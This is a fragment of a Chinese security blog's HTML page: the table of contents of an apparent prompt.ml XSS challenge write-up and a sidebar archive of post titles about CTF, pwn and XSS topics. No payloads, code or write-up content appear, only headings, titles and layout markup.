<span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-3"><span class="toc-number">3.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-3"><span class="toc-number">3.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-3"><span class="toc-number">3.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-3"><span class="toc-number">3.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-3"><span class="toc-number">3.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x03-闭合注释font"><span class="toc-number">4.</span> <span class="toc-text"> 0x03 闭合注释</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-4"><span class="toc-number">4.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-4"><span class="toc-number">4.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-4"><span class="toc-number">4.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-4"><span class="toc-number">4.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-4"><span class="toc-number">4.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-4"><span class="toc-number">4.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x04-url-编码绕过font"><span class="toc-number">5.</span> <span class="toc-text"> 0x04 URL 编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-5"><span class="toc-number">5.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-5"><span class="toc-number">5.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-5"><span class="toc-number">5.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-5"><span class="toc-number">5.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-5"><span class="toc-number">5.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-5"><span class="toc-number">5.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x05-属性覆盖及换行绕过font"><span class="toc-number">6.</span> <span class="toc-text"> 0x05 属性覆盖及换行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-6"><span class="toc-number">6.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-6"><span class="toc-number">6.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-6"><span class="toc-number">6.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-6"><span class="toc-number">6.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-6"><span class="toc-number">6.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-6"><span class="toc-number">6.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x06-dom-破坏font"><span class="toc-number">7.</span> <span class="toc-text"> 0x06 DOM 破坏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-7"><span class="toc-number">7.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-7"><span class="toc-number">7.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-7"><span class="toc-number">7.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-7"><span class="toc-number">7.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-7"><span class="toc-number">7.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-7"><span class="toc-number">7.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x07font"><span class="toc-number">8.</span> <span class="toc-text"> 0x07</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-8"><span class="toc-number">8.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-8"><span class="toc-number">8.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-8"><span class="toc-number">8.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-8"><span class="toc-number">8.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-8"><span class="toc-number">8.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-8"><span class="toc-number">8.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x08font"><span class="toc-number">9.</span> <span class="toc-text"> 0x08</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-9"><span class="toc-number">9.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-9"><span class="toc-number">9.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-9"><span class="toc-number">9.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-9"><span class="toc-number">9.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-9"><span class="toc-number">9.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-9"><span class="toc-number">9.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x09font"><span class="toc-number">10.</span> <span class="toc-text"> 0x09</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-10"><span class="toc-number">10.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-10"><span class="toc-number">10.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-10"><span class="toc-number">10.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-10"><span class="toc-number">10.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-10"><span class="toc-number">10.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-10"><span class="toc-number">10.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0afont"><span class="toc-number">11.</span> <span class="toc-text"> 0x0A</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-11"><span class="toc-number">11.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-11"><span class="toc-number">11.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-11"><span class="toc-number">11.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-11"><span class="toc-number">11.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-11"><span class="toc-number">11.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-11"><span class="toc-number">11.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0bfont"><span class="toc-number">12.</span> <span class="toc-text"> 0x0B</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-12"><span class="toc-number">12.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-12"><span class="toc-number">12.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-12"><span class="toc-number">12.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-12"><span class="toc-number">12.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-12"><span class="toc-number">12.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-12"><span class="toc-number">12.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0cfont"><span class="toc-number">13.</span> <span class="toc-text"> 0x0C</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-13"><span class="toc-number">13.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-13"><span class="toc-number">13.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-13"><span class="toc-number">13.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-13"><span class="toc-number">13.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-13"><span class="toc-number">13.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-13"><span class="toc-number">13.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0dfont"><span class="toc-number">14.</span> <span class="toc-text"> 0x0D</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-14"><span class="toc-number">14.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-14"><span class="toc-number">14.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-14"><span class="toc-number">14.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-14"><span class="toc-number">14.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-14"><span class="toc-number">14.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-14"><span class="toc-number">14.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0efont"><span class="toc-number">15.</span> <span class="toc-text"> 0x0E</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-15"><span class="toc-number">15.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-15"><span class="toc-number">15.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-15"><span class="toc-number">15.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-15"><span class="toc-number">15.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-15"><span class="toc-number">15.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-15"><span class="toc-number">15.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x0ffont"><span class="toc-number">16.</span> <span class="toc-text"> 0x0F</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-16"><span class="toc-number">16.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-16"><span class="toc-number">16.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-16"><span class="toc-number">16.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-16"><span class="toc-number">16.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-16"><span class="toc-number">16.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-16"><span class="toc-number">16.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 96
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href="/2020/02/27/2020.02.27（96）/">This_1s_pr0mpt.ml_writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2020/02/24/2020.02.24（95）/">【知识点整理】 浏览器编码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/2020.02.09（92）/">各种文件的文件头和文件尾总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2020/01/30/2020.01.30（91）/">【WP】XCFT misc新手阶段</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2019/11/23/2019.11.23（90）/">以太坊智能合约漏洞 | Fallback函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/2019/11/19/2019.11.19（89）/">XSS Challenge（Stage1-4）writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2019/11/07/2019.11.07（88）/">Cookie、Session、Token那点事儿（转载）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href="/2019/11/05/2019.11.05（87）/">有关内核调用问题和预编译指令</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2019/10/16/2019.10.16（86）/">PWN 实战 - shellcode 题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/12</span><a class="archive-post-title" href="/2019/10/12/2019.10.12（85）/">变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href="/2019/10/08/2019.09.28（84）/">pwn-ROP(GOT表泄露)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2019/09/24/2019.09.24（83）/">pwn-bof（基础类型题目）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href="/2019/09/17/2019.09.17（82）/">bash 漏洞（pwnable-shellshock）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href="/2019/09/10/2019.09.10（81）/">GOT 表攻击实例（pwnbable.kr_passcode）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href="/2019/09/07/2019.09.07（80）/">AFL 的代码插桩问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2019/09/02/2019.09.02（79）/">XCTF 新人阶段 — web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/2019.08.01（78）/">BabyPHP 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href="/2019/07/31/2019.07.31（77）/">JavaScript 学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href="/2019/07/27/2019.07.27（76）/">BaByXSS 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href="/2019/07/26/2019.07.26（75）/">XSS 基础知识（一）</a>
+        </li>
+    
+    
